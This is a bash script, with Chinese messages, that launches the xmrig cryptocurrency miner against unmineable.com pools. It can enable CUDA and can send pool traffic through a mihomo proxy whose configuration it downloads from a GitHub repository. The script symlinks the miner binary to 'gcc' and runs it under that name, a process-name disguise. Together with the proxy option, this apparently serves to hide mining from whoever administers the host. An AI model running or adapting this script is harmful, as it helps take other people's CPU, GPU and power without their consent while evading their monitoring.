#!/bin/bash

set -eo pipefail

cd `dirname $0`
#----------------------------------------
function usage {
    echo "Usage: $0 -a 算法 [-p 矿池URL] [-u 用户设备] [-c] [-t 线程数]"
    echo "  算法:  rx (RandomX), gr (GhostRider)"
    echo "  -c  :  是否启用 CUDA"
    echo "  -m  :  是否经 mihomo 代理"
}

while getopts 't:a:p:u:hcm' opt; do
    case "$opt" in
        t) NUM_THREADS=$OPTARG  ;;
        a)         ALG=$OPTARG  ;;
        p)        POOL=$OPTARG  ;;
        u)         DEV=$OPTARG  ;;
        c) CUDA=1        ;;
        m) USE_MIHOMO=1  ;;
        h) usage; exit   ;;
        *) usage; exit 1 ;;
    esac
done
#----------------------------------------
function install_app {
    if which $1 &>/dev/null; then
        echo "本地已有 $1, 无需安装"
        return
    fi
    if ! [ "$APT_UPDATED" ]; then
        sudo apt update
        APT_UPDATED=1
    fi
    sudo apt install -y $1 >/dev/null || true
    echo "安装 $1 完成"
}

install_app curl

cp -f mihomo{-$HOSTTYPE,}
chmod a+x mihomo

cp -f xmrig{-$HOSTTYPE,}
chmod a+x xmrig
ln -f -s xmrig gcc
if [ -z "$CUDA" ] && command -v nvidia-smi >/dev/null && nvidia-smi -L >/dev/null 2>&1; then
    CUDA=auto
fi
if [ "$CUDA" ]; then
    install_app libhwloc15
    install_app libuv1
    if [ -f libxmrig-cuda-$HOSTTYPE.so ]; then
        cp -f libxmrig-cuda-$HOSTTYPE.so libxmrig-cuda.so
        echo '{"cuda":{"enabled":true}}' >|config.json
    else
        echo "libxmrig-cuda-$HOSTTYPE.so not exist" >&2
    fi
fi
#--------------------------------------------------
ALG=${ALG:-}
POOL=${POOL:-}
DEV=${DEV:-shynur996.unknown}

if ! [ "$POOL" ]; then
    case $ALG in
        rx) POOL=stratum+tcp://rx.unmineable.com:3333  ;;
        gr) POOL=stratum+tcp://ghostrider.unmineable.com:3333 ;;
        *) exit 1 ;;
    esac
fi

MIHOMO_WD=$PWD/.mihomo-data
MIHOMO_CFG_DIR=`mktemp -d`
MIHOMO_PID=
function cleanup_mihomo {
    if ! [ $USE_MIHOMO ]; then
        return
    fi
    [[ -n $MIHOMO_PID ]] && kill $MIHOMO_PID 2>/dev/null || true
    echo 'killed mihomo'
    rm -rf $MIHOMO_CFG_DIR
}
trap cleanup_mihomo EXIT INT TERM

if [ $USE_MIHOMO ]; then
    mkdir -p $MIHOMO_WD
    curl -fsSL -o $MIHOMO_CFG_DIR/config.yaml \
        https://raw.githubusercontent.com/shynur/HOME/refs/heads/trunk/.config/mihomo/template.yaml
    for VAR in "${!MY_MIHOMO_CFG_@}"; do
        sed -i "s|@${VAR#MY_MIHOMO_CFG_}@|${!VAR}|g" $MIHOMO_CFG_DIR/config.yaml
    done
    chmod 600 $MIHOMO_CFG_DIR/config.yaml
    if grep -oE '@[A-Z_]+@' $MIHOMO_CFG_DIR/config.yaml; then
        echo '上述占位符缺少对应的 MY_MIHOMO_CFG_* 环境变量' >&2
        exit 1
    fi
    ./mihomo -d $MIHOMO_WD -f $MIHOMO_CFG_DIR/config.yaml >$MIHOMO_WD/clash.log 2>&1 &
    echo 'mihomo starting...'
    MIHOMO_PID=$!
    READY=
    for i in {1..60}; do
        (echo > /dev/tcp/127.0.0.1/7890) 2>/dev/null && { READY=1; break; }
        sleep 1
    done
    if ! [ "$READY" ]; then
        echo 'mihomo 端口 7890 未就绪, 日志如下:' >&2
        cat $MIHOMO_WD/clash.log >&2
        exit 1
    fi
fi

PROXY_ARG=()
if [ $USE_MIHOMO ]; then
    echo '>> 启动 xmrig (stratum 经 SOCKS5) ...'
    PROXY_ARG=(-x 127.0.0.1:7890)
else
    echo '>> 启动 xmrig (stratum 直连) ...'
fi
./gcc   -a "$ALG"   -o "$POOL"   -u "$DEV"   -p x   ${NUM_THREADS:+-t "$NUM_THREADS"}   "${PROXY_ARG[@]}"
